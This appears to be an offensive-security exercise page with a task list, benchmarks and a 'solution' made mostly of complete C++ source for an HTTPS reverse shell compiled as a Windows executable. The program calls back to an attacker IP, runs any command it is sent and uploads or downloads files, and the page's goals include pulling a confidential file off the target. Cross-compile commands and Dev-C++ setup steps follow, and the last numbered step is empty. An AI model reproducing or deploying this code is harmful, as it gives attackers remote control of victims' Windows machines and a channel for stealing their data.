# Write A HTTPS Reverse-Shell As A Windows Executable
An HTTPS reverse shell is a tool hackers use to remotely control a target computer by establishing a secure connection via a crafted HTTPS URL. Once accessed, it opens a reverse shell on the hacker’s system, allowing remote access to view or modify the target’s files more securely than a plaintext HTTP connection


## References
- [Reverse Connection](https://en.wikipedia.org/wiki/Reverse_connection) by Wikipedia


## Tasks
- Develop a program that constructs a HTTPS reverse shell in the form of a Windows executable. The program must achieve the following
  - Facilitate reverse connections over HTTPS to ensure secure communication
  - Provide functionality to execute remote commands on the target machine
  - Implement the capability to upload files to the target machine
  - Incorporate the ability to download files from the target machine


## Benchmarks
- Execute the Windows executable on the attacker's machine
- Illustrate the process of establishing a reverse shell connection to the attacker's machine through HTTPS
- Demonstrate the execution of a command on the target machine to retrieve the current user's group
- Showcase the successful upload of a Sysinternals Suite executable (e.g., "PsExec.exe") from the attacker's machine to the target machine
- Validate the successful transfer of the Sysinternals Suite executable on the target machine by executing it
- Display the successful download of a sensitive file (e.g., "confidential.txt") from the target machine to the attacker's system



## Solutions With Scripts
1. Save the following C++ file and compile it as `httpsreverseshell.exe`
   ```
    #include <iostream>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #include <fstream>
    
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "libssl.lib")
    #pragma comment(lib, "libcrypto.lib")
    
    #define SERVER_HOST "192.168.1.100" // Replace with your attacker's IP
    #define SERVER_PORT 443
    
    void initialize_winsock() {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            std::cerr << "WSAStartup failed. Error: " << WSAGetLastError() << std::endl;
            exit(EXIT_FAILURE);
        }
    }
    
    SSL_CTX* initialize_openssl() {
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();
        return SSL_CTX_new(TLS_client_method());
    }
    
    SSL* establish_https_connection(SSL_CTX* ctx) {
        struct sockaddr_in server_addr;
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed. Error: " << WSAGetLastError() << std::endl;
            exit(EXIT_FAILURE);
        }
    
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_HOST, &server_addr.sin_addr);
    
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "Connection failed. Error: " << WSAGetLastError() << std::endl;
            exit(EXIT_FAILURE);
        }
    
        SSL* ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) <= 0) {
            std::cerr << "SSL connection failed." << std::endl;
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
    
        return ssl;
    }
    
    std::string execute_command(const std::string& cmd) {
        char buffer[128];
        std::string result = "";
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) return "Error executing command.";
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        _pclose(pipe);
        return result;
    }
    
    void upload_file(SSL* ssl, const std::string& filepath) {
        std::ofstream out(filepath, std::ios::binary);
        char buffer[1024];
        int bytes_read;
        while ((bytes_read = SSL_read(ssl, buffer, sizeof(buffer))) > 0) {
            out.write(buffer, bytes_read);
        }
        out.close();
    }
    
    void download_file(SSL* ssl, const std::string& filepath) {
        std::ifstream in(filepath, std::ios::binary);
        char buffer[1024];
        while (in.read(buffer, sizeof(buffer))) {
            SSL_write(ssl, buffer, in.gcount());
        }
        in.close();
    }
    
    int main() {
        initialize_winsock();
        SSL_CTX* ctx = initialize_openssl();
        SSL* ssl = establish_https_connection(ctx);
    
        while (true) {
            char command[1024];
            int bytes = SSL_read(ssl, command, sizeof(command) - 1);
            if (bytes <= 0) break;
            command[bytes] = '\0';
    
            if (strncmp(command, "upload", 6) == 0) {
                upload_file(ssl, command + 7); // upload <filepath>
            } else if (strncmp(command, "download", 8) == 0) {
                download_file(ssl, command + 9); // download <filepath>
            } else {
                std::string result = execute_command(command);
                SSL_write(ssl, result.c_str(), result.length());
            }
        }
    
        SSL_shutdown(ssl);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        WSACleanup();
        return 0;
    }
   ```
2. To cross-compile on Kali Linux as the attacker machine, use
   ```
   x86_64-w64-mingw32-g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -lssl -lcrypto
   ```
   To compile using MinGW or another suitable Windows-compatible compiler, use
   ```
   g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -lssl -lcrypto
   ```
   To compile in Dev-C++, download the precompiled OpenSSL binaries for Windows. Ensure they match the architecture (32-bit or 64-bit) of your system.
   Add the OpenSSL include and library directories to Dev-C++:
   - Go to Tools → Compiler Options
   - Under Directories → C Includes, add the path to the OpenSSL include folder
   - Under Directories → Libraries, add the path to the OpenSSL lib folder
   Add Required Libraries:
   - Go to Project → Project Options → Parameters → Linker
   - Add the following linker flags:
     ```
     -lws2_32 -lssl -lcrypto
     ```
3. 
